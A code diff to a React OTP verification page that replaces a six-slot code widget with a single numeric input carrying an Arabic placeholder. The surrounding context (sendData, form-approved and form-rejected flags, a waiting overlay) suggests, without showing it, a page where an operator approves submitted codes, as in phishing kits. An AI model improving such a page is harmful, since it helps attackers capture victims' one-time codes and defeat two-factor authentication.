@@ -3,11 +3,7 @@ import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
+import { Input } from "@/components/ui/input";
 import {
   sendData,
   isFormApproved,
@@ -41,6 +37,12 @@ export default function OTPVerification() {
       inputRef.current?.focus();
     }
   }, [isFormRejected.value]);
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
+    setOtp(value);
+    setError(false);
+  };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -97,25 +99,19 @@ export default function OTPVerification() {
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-6">
-          {/* OTP Input - 6 slots but accepts 4 or 6 */}
+          {/* OTP Input - Single input field */}
           <div className="flex justify-center" dir="ltr">
-            <InputOTP
+            <Input
+              ref={inputRef}
+              type="tel"
+              inputMode="numeric"
               maxLength={6}
               value={otp}
-              onChange={(value) => {
-                setOtp(value);
-                setError(false);
-              }}
-            >
-              <InputOTPGroup>
-                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={4} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={5} className={error ? "border-red-500" : ""} />
-              </InputOTPGroup>
-            </InputOTP>
+              onChange={handleChange}
+              placeholder="أدخل رمز التحقق"
+              className={`text-center text-2xl font-mono tracking-[0.5em] h-14 w-48 ${error ? "border-red-500" : ""}`}
+              autoFocus
+            />
           </div>
 
           {error && (
